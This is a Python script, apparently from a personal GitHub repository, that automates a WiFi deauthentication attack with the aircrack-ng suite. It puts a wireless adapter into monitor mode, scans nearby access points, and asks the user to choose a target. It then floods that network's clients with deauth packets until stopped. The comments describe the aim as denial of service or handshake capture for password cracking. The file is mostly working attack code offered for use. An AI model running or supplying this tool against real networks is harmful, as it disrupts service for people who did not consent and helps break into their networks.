import subprocess # For running background terminal commands in Kali Linux
import re # For using regular expressions to find the WiFi interfaces in the output of iwconfig
import csv # For reading the .csv files that airodump-ng creates to find the wireless networks and their details
import os # For Checking Sudo is used or not
import time # For time.sleep()
import shutil # For move the .csv files to folder
from datetime import datetime # Create a wait time for creating .csv file

active_wireless_networks = [] # An Empty List to stroe the Scanned Wireless Networks

def check_for_essid(essid, lst):
    check_status = True
    # If ESSIDs is not in list, Create a row
    if len(lst) == 0:
        return check_status

    for item in lst: # Run only Wireless AP is in the List
        if essid in item["ESSID"]: # If ESSID is True don't add in list
            check_status = False 

    return check_status

print(r"""
 _    _        _                        _                    
| |  | |      (_)                      | |                   
| |__| |  ___  _    ___   ___   ___    | |__    ___  ____  ____ 
|  __  | / _ \| |  / __| / _ \ | __ \  |  _ \  / _ \| __/ / _  |
| |  | ||  __/| |  \__ \\  __/ | | | | | |_) ||  __/| |  ( |_| |
|_|  |_| \___||_| /____/ \___| |_| |_| |____/  \___||_|   \__, |
                                                           __/ |
                                                          |___/ """)
print("\n****************************************************************")
print("\n* Copyright of BharathkrishnaH4X, 2026                         *")
print("\n* https://github.com/BharathkrishnaH4X                         *")
print("\n****************************************************************")

# This Program should run in super user privileges because the process uses airmon-ng commands to deauth
# For run the Program only in 'sudo' super user privilege 
if not 'SUDO_UID' in os.environ.keys(): # If no sudo, end the program 
    time.sleep(1)
    print("\n\t************Try running this program with sudo.*************")
    print("\n\tExample: sudo python3 wifi_dos.py")
    exit()

# Moving all .csv to another folder 'backup'
for file_name in os.listdir(): 
    # Only one .csv to avoid run time error
    if ".csv" in file_name: 
        print("There shouldn't be any .csv files in your directory. We found .csv files in your directory.")
        # Current Working Directory
        directory = os.getcwd() 
        try:
            # Creating backup folder
            os.mkdir(directory + "/backup/") 
        except:
            print("Backup folder exists.")
        # Folder Creation Time
        timestamp = datetime.now() 
        # Copy the .csv to backup folder
        shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name) 

wlan_pattern = re.compile("^wlan[0-9]+") # For find the Wireless Interfaces

# Creating a Subprocess for Running a List of Commands
# 'iwconfig' for viewing wireless interfaces
check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

# Check for Adapter
if len(check_wifi_result) == 0:
    print("Please connect a WiFi controller and try again.")
    exit()

# Selcting wlan interface
print("The following WiFi interfaces are available:")
for index, item in enumerate(check_wifi_result):
    print(f"{index} - {item}")

# Checking the interfaces is present or not
while True:
    wifi_interface_choice = input("Please select the interface you want to use for the attack: ")
    try:
        if check_wifi_result[int(wifi_interface_choice)]:
            break
    except:
        print("Please enter a number that corresponds with the choices.")

# Naming the selected interface as hacknic
hacknic = check_wifi_result[int(wifi_interface_choice)] 

# Kill the processes that can cause problems with airmon-ng
print("WiFi adapter connected!\nNow let's kill conflicting processes:")

# subprocess.run() is used to run the command in the terminal and wait for it to finish before moving on to the next line of code
kill_confilict_processes =  subprocess.run(["sudo", "airmon-ng", "check", "kill"])

# Wireless in Monitored Mode
print("Putting Wifi adapter into monitored mode:")
put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic])

# subprocess.Popen() is used to run the command in the terminal and continue with the next line of code without waiting for it to finish
discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Loop for Scanning the Wireless Networks and their details
try:
    while True:
        # Clear the terminal for better readability
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
                # The csv file is created by airodump-ng and it contains the details of the wireless networks that are in range. 
                # We need to read the csv file to get the details of the wireless networks and store them in a list.
                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                if ".csv" in file_name:
                    with open(file_name) as csv_h:
                        # To run the loop only for the wireless APs and not for the clients
                        # # We need to check for the BSSID and ESSID fields in the csv file.
                        csv_h.seek(0)
                        # csv.DictReader() is used to read the csv file and store the details of the wireless networks in a list of dictionaries.
                        # Create a dictionary for each row in the csv file and store it in a list. 
                        # The keys of the dictionary are the fieldnames that we defined earlier.
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            # The BSSID field is the MAC address of the wireless AP and the ESSID field is the name of the wireless network. 
                            # We need to check for these fields to get the details of the wireless networks and store them in a list.
                            if row["BSSID"] == "BSSID":
                                pass
                            # The Client are Unnecessary for our attack, so we need to break the loop when we reach the Client section in the csv file.
                            elif row["BSSID"] == "Station MAC":
                                break
                            # Every field where an ESSID is present and not in the list
                            # We need to add it to the list of active wireless networks.
                            elif check_for_essid(row["ESSID"], active_wireless_networks):
                                active_wireless_networks.append(row)

        print("Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n")
        print("No |\tBSSID              |\tChannel|\tESSID                         |")
        print("___|\t___________________|\t_______|\t______________________________|")
        for index, item in enumerate(active_wireless_networks):
            # Print the details of the wireless networks in a formatted way for better readability.
            # F-String is used to format the output in a readable way.
            # The index is used to select the wireless network for the attack and the BSSID
            # Channel and ESSID are the details of the wireless network that we need for the attack.
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
        # Sleep for 1 second before the next scan to avoid overwhelming the system with too many scans in a short period of time.
        time.sleep(1)

except KeyboardInterrupt:
    print("\nReady to make choice.")

# Ensure that the user selects a valid choice for the wireless network to attack.
while True:
    # The user is prompted to select a choice from the list of active wireless networks that are in range.
    choice = input("Please select a choice from above: ")
    # We need to check if the choice is valid and if it corresponds to a wireless network in the list of active wireless networks. If it does, we can break the loop and proceed with the attack. If it doesn't, we need to prompt the user to try again.
    try:
        if active_wireless_networks[int(choice)]:
            break
    # If the user enters an invalid choice, we need to catch the exception and prompt the user to try again.
    except:
        print("Please try again.")

# The BSSID and channel of the selected wireless network are stored in variables for later use in the attack.
# We assign the Result Variables for the attack from the selected wireless network in the list of active wireless networks.
hackbssid = active_wireless_networks[int(choice)]["BSSID"]
hackchannel = active_wireless_networks[int(choice)]["channel"].strip()

# Change to the channel of the selected wireless network for better performance in the attack.
# Monitoring takes place in a different channel than the one we are currently on, so we need to change to the channel of the selected wireless network for better performance in the attack.
subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])

# Deauthenticating the clients that are connected to the selected wireless network to disconnect them from the network and force them to reconnect, which can be useful for capturing the handshake for cracking the password or for performing a denial of service attack.
subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) 

# We run the deauthentication attack in a loop to continuously deauthenticate the clients that are connected to the selected wireless network until the user decides to stop the attack by pressing Ctrl+C. This allows us to keep the clients disconnected from the network and force them to reconnect, which can be useful for capturing the handshake for cracking the password or for performing a denial of service attack.
# Ctrl+C is used to stop the attack and exit the program gracefully by stopping the monitoring mode and thanking the user for using the program before exiting.
try:
    while True:
        # The user is informed that the deauthentication attack is in progress and that they can stop it by pressing Ctrl+C.
        print("Deauthenticating clients, press ctrl-c to stop")
except KeyboardInterrupt:
    # When the user presses Ctrl+C, we need to stop the attack and exit the program gracefully by stopping the monitoring mode and thanking the user for using the program before exiting.
    print("Stop monitoring mode")
    # subprocess.run() is used to run the command in the terminal and wait for it to finish before moving on to the next line of code. We need to stop the monitoring mode to return the wireless interface to its normal state and avoid any potential issues with other wireless networks or devices that may be in range.
    subprocess.run(["airmon-ng", "stop", hacknic + "mon"])
    print("Thank you! Exiting now")
    exit()
